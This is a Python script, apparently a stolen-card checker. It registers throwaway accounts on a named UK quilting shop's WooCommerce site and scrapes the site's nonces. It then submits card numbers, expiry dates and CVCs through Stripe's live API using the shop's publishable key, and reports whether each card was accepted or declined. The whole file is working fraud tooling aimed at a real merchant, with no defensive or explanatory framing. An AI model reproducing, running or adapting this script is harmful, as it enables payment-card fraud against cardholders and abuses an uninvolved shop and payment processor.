import requests
import pyfiglet
import time
import os
import random
import re
def gets(text, start, end):
    try:
        return text.split(start)[1].split(end)[0]
    except IndexError:
        return ""

def Tele(ccx):
    # Parse card details
    ccx = ccx.strip()
    n = ccx.split("|")[0]  # Card number
    mm = ccx.split("|")[1]  # Expiry month
    yy = ccx.split("|")[2]  # Expiry year
    cvc = ccx.split("|")[3]  # Card CVC
    mail = "criehs4d" + str(random.randint(584, 5658)) + "@gmail.com"  # Fixed typo: gamil -> gmail

    # Step 1: Get the registration page and extract nonce
    response = requests.get('https://quiltedbear.co.uk/my-account/')
    nonce_pattern = r'name="woocommerce-register-nonce" value="(.*?)"'
    match = re.search(nonce_pattern, response.text)
    nonce = match.group(1) if match else ""

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,hi;q=0.6,sl;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://quiltedbear.co.uk',
        'priority': 'u=0, i',
        'referer': 'https://quiltedbear.co.uk/my-account/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    }

    data = {
        'username': mail,
        'email': mail,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://quiltedbear.co.uk/my-account/',
        'wc_order_attribution_session_start_time': '2025-03-12 06:03:52',
        'wc_order_attribution_session_pages': '6',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    response = requests.post('https://quiltedbear.co.uk/my-account/', headers=headers, data=data)

    # Step 2: Get payment method page and extract payment nonce
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,hi;q=0.6,sl;q=0.5',
            'priority': 'u=0, i',
            'referer': 'https://quiltedbear.co.uk/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        }

    response = requests.get('https://quiltedbear.co.uk/my-account/add-payment-method/', headers=headers)
    response_text = response.text 
    pattern1 = r'"createAndConfirmSetupIntentNonce":"(.*?)"'
    match1 = re.search(pattern1, response_text)
    payment_nonce = match1.group(1) if match1 else ""

    # Step 3: Create payment method with Stripe
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,hi;q=0.6,sl;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    }

    data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '10080',
        'billing_details[address][country]': 'US',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/1a93d1fced; stripe-js-v3/1a93d1fced; payment-element; deferred-intent',
        'referrer': 'https://quiltedbear.co.uk',
        'time_on_page': '137739',
        'client_attribution_metadata[client_session_id]': 'e7f6ea90-d221-401e-8c92-aaf9d790f2de',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'key': 'pk_live_90o1zSEv0cxulJp2q9wFbksO',
        '_stripe_version': '2024-06-20',
    }

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id = response.json()['id']

    # Step 4: Confirm setup intent
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,hi;q=0.6,sl;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://quiltedbear.co.uk',
        'priority': 'u=1, i',
        'referer': 'https://quiltedbear.co.uk/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }

    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': payment_nonce,
    }

    response = requests.post('https://quiltedbear.co.uk/', params=params, headers=headers, data=data)
    msg = response.text

    try:
        response_data = response.json()
        if response_data.get('success') == True:
            if response_data['data'].get('status') == 'succeeded':
                return "Nice payment added "
            else:
                return response_data['data']
        else:
            error_message = response_data['data'].get('error', {}).get('message', '')
            if "Your card was declined" in error_message:
                print("Decline")
                return "card was declined"
            else:
                return error_message
    except ValueError:
        return msg
        

